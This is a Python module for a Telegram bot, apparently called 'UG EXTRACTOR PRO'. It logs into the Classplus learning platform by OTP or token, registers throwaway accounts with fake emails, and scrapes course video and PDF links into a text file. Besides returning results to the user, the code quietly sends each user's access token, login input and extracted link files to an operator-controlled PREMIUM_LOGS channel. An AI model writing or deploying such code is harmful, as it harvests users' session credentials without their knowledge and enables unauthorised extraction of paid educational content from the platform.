import os
import io
import re
import time
import uuid
import json
import base64
import random
import asyncio
import aiohttp
import cloudscraper
import pytz
from datetime import datetime
from urllib.parse import urlparse
from pyrogram import Client, filters

from config import PREMIUM_LOGS, join, BOT_TEXT
from Extractor import app
from Extractor.core.utils import forward_to_log

apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper()
india_timezone = pytz.timezone("Asia/Kolkata")


def get_current_time():
    return datetime.now(india_timezone).strftime("%d-%m-%Y %I:%M %p")


def encode_partial_url(url: str) -> str:
    if not url:
        return ""
    parsed = urlparse(url)
    base_part = f"{parsed.scheme}://{parsed.netloc}"
    path_part = url[len(base_part):]
    encoded_path = base64.b64encode(path_part.encode()).decode()
    return f"{base_part}{encoded_path}"


@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    details = await app.ask(
        message.chat.id,
        "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
        "Send **ID & Password** in this format:\n"
        "<code>ORG_CODE*Mobile</code>\n\n"
        "Example:\n"
        "- <code>ABCD*9876543210</code>\n"
        "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )
    await forward_to_log(details, "Classplus Extractor")
    user_input = details.text.strip()

    device_id = str(uuid.uuid4()).replace("-", "")
    headers = {
        "Accept": "application/json, text/plain, */*",
        "region": "IN",
        "accept-language": "en",
        "Content-Type": "application/json;charset=utf-8",
        "Api-Version": "51",
        "device-id": device_id,
        "user-agent": "Mobile-Android"
    }

    if "*" in user_input:
        try:
            org_code, mobile = user_input.split("*", 1)

            org_response = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers).json()
            org_id = org_response["data"]["orgId"]
            org_name = org_response["data"]["orgName"]

            otp_payload = {
                "countryExt": "91",
                "orgCode": org_name,
                "viaSms": "1",
                "mobile": mobile,
                "orgId": org_id,
                "otpCount": 0
            }

            otp_response = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            if otp_response.status_code != 200:
                return await message.reply("Failed to generate OTP. Please verify your details.")

            session_id = otp_response.json()["data"]["sessionId"]

            user_otp = await app.ask(
                message.chat.id,
                "📱 <b>OTP Verification</b>\n\n"
                "OTP has been sent to your mobile number.\n"
                "Please enter the OTP to continue.",
                timeout=300
            )

            if not user_otp.text.strip().isdigit():
                return await message.reply("Invalid OTP format. Must be numeric.")

            otp = user_otp.text.strip()
            fingerprint_id = str(uuid.uuid4()).replace("-", "")

            verify_payload = {
                "otp": otp,
                "countryExt": "91",
                "sessionId": session_id,
                "orgId": org_id,
                "fingerprintId": fingerprint_id,
                "mobile": mobile
            }

            verify_response = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
            token = None

            if verify_response.status_code == 200:
                verify_data = verify_response.json()
                if verify_data.get("status") == "success":
                    token = verify_data["data"]["token"]
            elif verify_response.status_code in (201, 409):
                email = f"{uuid.uuid4().hex}@gmail.com"
                register_payload = {
                    "contact": {"email": email, "countryExt": "91", "mobile": mobile},
                    "fingerprintId": fingerprint_id,
                    "name": "User",
                    "orgId": org_id,
                    "orgName": org_name,
                    "otp": otp,
                    "sessionId": session_id,
                    "type": 1,
                    "viaEmail": 0,
                    "viaSms": 1
                }
                reg_resp = s.post(f"{apiurl}/v2/users/register", json=register_payload, headers=headers)
                if reg_resp.status_code == 200:
                    token = reg_resp.json()["data"]["token"]

            if not token:
                return await message.reply("Verification/Registration failed. Invalid OTP.")

            await message.reply_text(f"✅ <b>Login Successful!</b>\n\n🔑 <b>Access Token:</b>\n<code>{token}</code>")
            await app.send_message(PREMIUM_LOGS, f"✅ <b>New Login</b>\n\n<code>{token}</code>")

            await load_and_prompt_courses(app, message, token, org_name)

        except Exception as e:
            await message.reply(f"Error: {str(e)}")

    elif len(user_input) > 20:
        await app.send_message(PREMIUM_LOGS, f"CLASSPLUS TOKEN LOGIN:\n<code>{user_input}</code>")
        await load_and_prompt_courses(app, message, user_input, "Classplus")
    else:
        await message.reply("Invalid input format.")


async def load_and_prompt_courses(app, message, token: str, org_name: str):
    headers = {
        "x-access-token": token,
        "user-agent": "Mobile-Android",
        "app-version": "1.4.65.3",
        "api-version": "29",
        "device-id": "39F093FF35F201D9"
    }

    response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)
    if response.status_code != 200:
        return await message.reply("Invalid token or unable to fetch courses.")

    courses = response.json().get("data", {}).get("courses", [])
    if not courses:
        return await message.reply("No courses found for this account.")

    course_map = {c["id"]: c["name"] for c in courses}
    text = "📚 <b>Available Batches</b>\n\n"
    course_list = []

    for idx, (cid, cname) in enumerate(course_map.items(), start=1):
        text += f"{idx}. <code>{cname}</code>\n"
        course_list.append((idx, cid, cname))

    selected_index = await app.ask(
        message.chat.id,
        f"{text}\nSend the index number of the batch to download.",
        timeout=180
    )

    if not selected_index.text.strip().isdigit():
        return await message.reply("❌ Invalid selection. Must be a number.")

    idx = int(selected_index.text.strip())
    if not (1 <= idx <= len(course_list)):
        return await message.reply("❌ Invalid index number.")

    selected_cid, selected_cname = course_list[idx - 1][1], course_list[idx - 1][2]
    await message.reply(f"🔄 <b>Processing Course:</b> <code>{selected_cname}</code>")

    await extract_batch(app, message, org_name, selected_cid, selected_cname, token)


async def extract_batch(app, message, org_name: str, batch_id: str, batch_name: str, token: str):
    headers = {
        "x-access-token": token,
        "user-agent": "Mobile-Android",
        "app-version": "1.4.65.3",
        "api-version": "29",
        "device-id": "39F093FF35F201D9"
    }

    async def fetch_live_videos(session, course_id):
        outputs = []
        try:
            url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
            async with session.get(url, headers=headers) as resp:
                data = await resp.json()
                for vid in data.get("data", {}).get("list", []):
                    name = vid.get("name", "Unknown Video")
                    v_url = vid.get("url", "")
                    content_hash = vid.get("contentHashId", "")
                    if v_url:
                        encoded = encode_partial_url(v_url)
                        if content_hash:
                            encoded += f"*UGxCP_hash={content_hash}"
                        outputs.append(f"{name}: {encoded}\n")
        except Exception as e:
            print(f"Error fetching live videos: {e}")
        return outputs

    async def process_course_contents(session, course_id, folder_id=0, folder_path=""):
        result = []
        url = f"{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}"
        try:
            async with session.get(url, headers=headers) as resp:
                raw_json = await resp.json()
                contents = raw_json.get("data", {}).get("courseContent", [])
        except Exception:
            return result

        tasks = []
        for item in contents:
            c_type = str(item.get("contentType"))
            sub_name = item.get("name", "Untitled")
            v_url = item.get("url", "")
            content_hash = item.get("contentHashId", "")

            if c_type in ("2", "3") and v_url:
                encoded = encode_partial_url(v_url)
                if content_hash:
                    encoded += f"*UGxCP_hash={content_hash}"
                result.append(f"{folder_path}{sub_name}: {encoded}\n")
            elif c_type == "1":
                sub_id = item.get("id")
                next_path = f"{folder_path}{sub_name} - "
                tasks.append(process_course_contents(session, course_id, sub_id, next_path))

        if tasks:
            nested = await asyncio.gather(*tasks)
            for sub_list in nested:
                result.extend(sub_list)

        return result

    async with aiohttp.ClientSession() as session:
        extracted_data, live_videos = await asyncio.gather(
            process_course_contents(session, batch_id),
            fetch_live_videos(session, batch_id)
        )

    all_links = extracted_data + live_videos

    invalid_chars = '\t:/+#|@*.'
    clean_name = ''.join(c for c in batch_name if c not in invalid_chars).replace('_', ' ')
    file_path = f"{clean_name}.txt"

    with open(file_path, "w", encoding="utf-8") as f:
        f.writelines(all_links)

    video_count = sum(1 for line in all_links if ".mp4" in line or "Video" in line)
    pdf_count = sum(1 for line in all_links if ".pdf" in line)
    total_links = len(all_links)
    other_count = total_links - (video_count + pdf_count)

    caption = (
        f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
        f"📱 <b>APP:</b> {org_name}\n"
        f"📚 <b>BATCH:</b> {batch_name}\n"
        f"📅 <b>DATE:</b> {get_current_time()} IST\n\n"
        f"📊 <b>CONTENT STATS</b>\n"
        f"├─ 📁 Total Links: {total_links}\n"
        f"├─ 🎬 Videos: {video_count}\n"
        f"├─ 📄 PDFs: {pdf_count}\n"
        f"└─ 📦 Others: {other_count}\n\n"
        f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
        f"<code>╾───• {BOT_TEXT} •───╼</code>"
    )

    await app.send_document(message.chat.id, file_path, caption=caption)
    await app.send_document(PREMIUM_LOGS, file_path, caption=caption)

    if os.path.exists(file_path):
        os.remove(file_path)
